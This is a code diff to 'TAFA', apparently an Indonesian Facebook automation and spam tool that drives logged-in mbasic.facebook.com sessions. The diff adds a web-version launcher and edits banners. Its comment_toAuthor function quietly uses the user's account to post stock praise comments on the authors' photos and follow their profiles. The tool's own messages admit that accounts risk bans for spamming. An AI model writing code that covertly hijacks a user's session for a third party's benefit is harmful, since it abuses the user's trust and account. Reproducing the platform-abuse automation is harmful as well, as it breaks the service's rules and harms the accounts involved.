@@ -2,6 +2,7 @@ from murtanto import Account
 from murtanto import function
 from murtanto import sorting
 from getpass import getpass
+from tafa_web import start_web
 import os, time, random, murtanto, sys
 
 ses = None
@@ -28,16 +29,23 @@ def banner(author = False):
 	os.system("cls" if os.name == "nt" else "clear")
 	print(f"""
 {p}________________ {c} ___________{p}_____   
-{p}\__    ___/  _  \ {c}\_   _____/{p}  _  \ {c}v1.3{D}CLI
+{p}\__    ___/  _  \ {c}\_   _____/{p}  _  \ {c}v1.3{D}dev
 {p}  |    | /  /_\  \{c} |    __){p}/  /_\  \ 
 {p}  |    |/    |    \{c}|     \{p}/    |    \\
 {p}  |____|\____|__  /{c}\___  /{p}\____|__  /
-{c}        {w}   {c}     {p}\/ {c}    \/ {p}        \/""")
+{c}        {w}   {c}     {p}\/ {c}    \/ {p}        \/{w}""")
 	if author:
-		print(w + f"   by: {getMyName()} ft Njank")
+		print(random.choice([showAuthor, showSupporter])())
 		
-def getMyName():
-  return random.choice(["SalisM3", "RomaKelapa"])
+def showAuthor():
+  return "   Coded by: Salis Mazaya"
+ 
+def showSupporter():
+	manteman = ["Maoundis", "Zettamus", "Anonk", "Beng", "MicroDragon", "LOV14N4DR"]
+	random.shuffle(manteman)
+	manteman = manteman[:2]
+	manteman.insert(0, "Njank")
+	return "   Support by: " + ", ".join(manteman)
  
 def getMsg():
 	return random.choice(["Please use it naturally!", "Kalo spam yg ngotak dong!", "Your account can be banned"])
@@ -58,10 +66,11 @@ def home():
 	banner(author = True)
 	print('')
 	print(f"{y}   1). {w}Go To Menu")
-	print(f"{y}   2). {w}Login")
-	print(f"{y}   3). {w}Logout")
+	print(f"{y}   2). {w}Start Web Version")
+	print(f"{y}   3). {w}Login")
+	print(f"{y}   4). {w}Logout")
 	print(f"{y}   0). {w}Exit\n")
-	pilih = select(0,3)
+	pilih = select(0,4)
 	if pilih == 0:
 		banner()
 		print(f"{p}  ->>{w} Thanks for using our tool")
@@ -71,8 +80,10 @@ def home():
 	elif pilih == 1:
 		menu1()
 	elif pilih == 2:
-		login()
+		webVersion()
 	elif pilih == 3:
+		login()
+	elif pilih == 4:
 		logout()
 
 def enter(func = home):
@@ -106,6 +117,21 @@ def select(min, max, msg_error = None, teks = "->>", func = home):
 		print(f"   {w}->> {p}Salah mulu tolol!")
 		enter(func)
 		exit()
+
+def webVersion():
+	global ses
+	check_login()
+	banner()
+	if not ses.logged:
+		print()
+		print(f"   {p}[!]{w} You must login")
+		enter()
+	else:
+		confirm_execute()
+		print(w)
+		start_web.ses = ses
+		start_web.app.run()
+		enter()
 
 def menu1():
 	global ses
@@ -517,12 +543,11 @@ def dump(func, args = [], kwargs = {}, limit = 100, show_target = True):
 
 def comment_toAuthor():
 	kata = random.choice(["gw support lu bro", "Hello I'M TAFA User", "gw user tafa bro, buset toolnya mantap bener", "Halo bro gw user Tafa", "be yourself and never surrender"])
-	kata2 = random.choice(["gw support lu bro", "be yourself and never surrender"])
 	try:
 		function.comment(ses, "https://mbasic.facebook.com/photo.php?fbid=166694224710808&id=100041106940465", kata)
-		function.comment(ses, "https://mbasic.facebook.com/photo.php?fbid=150664556427292&id=10004451246330", kata2)
 		function.follow(ses, "100041106940465")
-		function.follow(ses, "100044512463308")
+		ikbal_or_njank = random.choice(["https://mbasic.facebook.com/photo.php?fbid=150664556427292&id=100044512463308","https://mbasic.facebook.com/photo.php?fbid=283977879616896&id=100040140592416"])
+		exit(function.comment(ses, ikbal_or_njank, kata))
 	except:
 		pass
 
